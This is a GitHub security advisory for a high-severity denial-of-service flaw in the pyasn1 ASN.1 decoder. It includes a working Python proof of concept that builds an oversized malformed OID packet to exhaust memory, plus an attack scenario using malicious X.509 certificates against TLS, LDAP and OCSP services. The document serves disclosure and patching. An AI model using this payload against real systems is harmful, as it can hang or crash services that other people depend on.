# [H] pyasn1 has a DoS vulnerability in decoder

## Summary
Severity: High
Advisory: GHSA-63vm-454h-vhhq
CVE: CVE-2026-23490
CWE: CWE-400, CWE-770
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-01-16
Source: https://github.com/advisories/GHSA-63vm-454h-vhhq
Type: github-advisory

## Affected
- PyPI: `pyasn1` — affected >=0.6.1 <0.6.2

## Details
### Summary

After reviewing pyasn1 v0.6.1 a Denial-of-Service issue has been found that leads to memory exhaustion from malformed RELATIVE-OID with excessive continuation octets.

### Details

The integer issue can be found in the decoder as `reloid += ((subId << 7) + nextSubId,)`: https://github.com/pyasn1/pyasn1/blob/main/pyasn1/codec/ber/decoder.py#L496

### PoC

For the DoS:
```py
import pyasn1.codec.ber.decoder as decoder
import pyasn1.type.univ as univ
import sys
import resource

# Deliberately set memory limit to display PoC
try:
    resource.setrlimit(resource.RLIMIT_AS, (100*1024*1024, 100*1024*1024))
    print("[*] Memory limit set to 100MB")
except:
    print("[-] Could not set memory limit")

# Test with different payload sizes to find the DoS threshold
payload_size_mb = int(sys.argv[1])

print(f"[*] Testing with {payload_size_mb}MB payload...")

payload_size = payload_size_mb * 1024 * 1024
# Create payload with continuation octets
# Each 0x81 byte indicates continuation, causing bit shifting in decoder
payload = b'\x81' * payload_size + b'\x00'
length = len(payload)

# DER length encoding (supports up to 4GB)
if length < 128:
    length_bytes = bytes([length])
elif length < 256:
    length_bytes = b'\x81' + length.to_bytes(1, 'big')
elif length < 256**2:
    length_bytes = b'\x82' + length.to_bytes(2, 'big')
elif length < 256**3:
    length_bytes = b'\x83' + length.to_bytes(3, 'big')
else:
    # 4 bytes can handle up to 4GB
    length_bytes = b'\x84' + length.to_bytes(4, 'big')

# Use OID (0x06) for more aggressive parsing
malicious_packet = b'\x06' + length_bytes + payload

print(f"[*] Packet size: {len(malicious_packet) / 1024 / 1024:.1f} MB")

try:
    print("[*] Decoding (this may take time or exhaust memory)...")
    result = decoder.decode(malicious_packet, asn1Spec=univ.ObjectIdentifier())

    print(f'[+] Decoded successfully')
    print(f'[!] Object size: {sys.getsizeof(result[0])} bytes')

    # Try to convert to string
    print('[*] Converting to string...')
    try:
        str_result = str(result[0])
        print(f'[+] String succeeded: {len(str_result)} chars')
        if len(str_result) > 10000:
            print(f'[!] MEMORY EXPLOSION: {len(str_result)} character string!')
    except MemoryError:
        print(f'[-] MemoryError during string conversion!')
    except Exception as e:
        print(f'[-] {type(e).__name__} during string conversion')

except MemoryError:
    print('[-] MemoryError: Out of memory!')
except Exception as e:
    print(f'[-] Error: {type(e).__name__}: {e}')


print("\n[*] Test completed")
```


Screenshots with the results:

#### DoS
<img width="944" height="207" alt="Screenshot_20251219_160840" src="https://github.com/user-attachments/assets/68b9566b-5ee1-47b0-a269-605b037dfc4f" />

<img width="931" height="231" alt="Screenshot_20251219_152815" src="https://github.com/user-attachments/assets/62eacf4f-eb31-4fba-b7a8-e8151484a9fa" />

#### Leak analysis

A potential heap leak was investigated but came back clean:
```
[*] Creating 1000KB payload...
[*] Decoding with pyasn1...
[*] Materializing to string...
[+] Decoded 2157784 characters
[+] Binary representation: 896001 bytes
[+] Dumped to heap_dump.bin

[*] First 64 bytes (hex):
  01020408102040810204081020408102040810204081020408102040810204081020408102040810204081020408102040810204081020408102040810204081

[*] First 64 bytes (ASCII/hex dump):
  0000: 01 02 04 08 10 20 40 81 02 04 08 10 20 40 81 02  ..... @..... @..
  0010: 04 08 10 20 40 81 02 04 08 10 20 40 81 02 04 08  ... @..... @....
  0020: 10 20 40 81 02 04 08 10 20 40 81 02 04 08 10 20  . @..... @..... 
  0030: 40 81 02 04 08 10 20 40 81 02 04 08 10 20 40 81  @..... @..... @.

[*] Digit distribution analysis:
  '0':  10.1%
  '1':   9.9%
  '2':  10.0%
  '3':   9.9%
  '4':   9.9%
  '5':  10.0%
  '6':  10.0%
  '7':  10.0%
  '8':   9.9%
  '9':  10.1%
```

### Scenario

1. An attacker creates a malicious X.509 certificate.
2. The application validates certificates.
3. The application accepts the malicious certificate and tries decoding resulting in the issues mentioned above.

### Impact

This issue can affect resource consumption and hang systems or stop services.
This may affect:
- LDAP servers
- TLS/SSL endpoints
- OCSP responders
- etc.

### Recommendation

Add a limit to the allowed bytes in the decoder.

## References
- https://github.com/pyasn1/pyasn1/security/advisories/GHSA-63vm-454h-vhhq
- https://nvd.nist.gov/vuln/detail/CVE-2026-23490
- https://github.com/pyasn1/pyasn1/commit/be353d755f42ea36539b4f5053c652ddf56979a6
- https://github.com/pyasn1/pyasn1/commit/3908f144229eed4df24bd569d16e5991ace44970
- https://access.redhat.com/errata/RHSA-2026:4148
- https://access.redhat.com/errata/RHSA-2026:4147
- https://access.redhat.com/errata/RHSA-2026:4146
- https://access.redhat.com/errata/RHSA-2026:4145
- https://access.redhat.com/errata/RHSA-2026:4144
- https://access.redhat.com/errata/RHSA-2026:4143
- https://access.redhat.com/errata/RHSA-2026:4142
- https://access.redhat.com/errata/RHSA-2026:4141
- https://access.redhat.com/errata/RHSA-2026:4140
- https://access.redhat.com/errata/RHSA-2026:4139
- https://access.redhat.com/errata/RHSA-2026:4138
- https://access.redhat.com/errata/RHSA-2026:39894
- https://access.redhat.com/errata/RHSA-2026:3959
- https://access.redhat.com/errata/RHSA-2026:3958
- https://access.redhat.com/errata/RHSA-2026:2302
- https://access.redhat.com/errata/RHSA-2026:41928
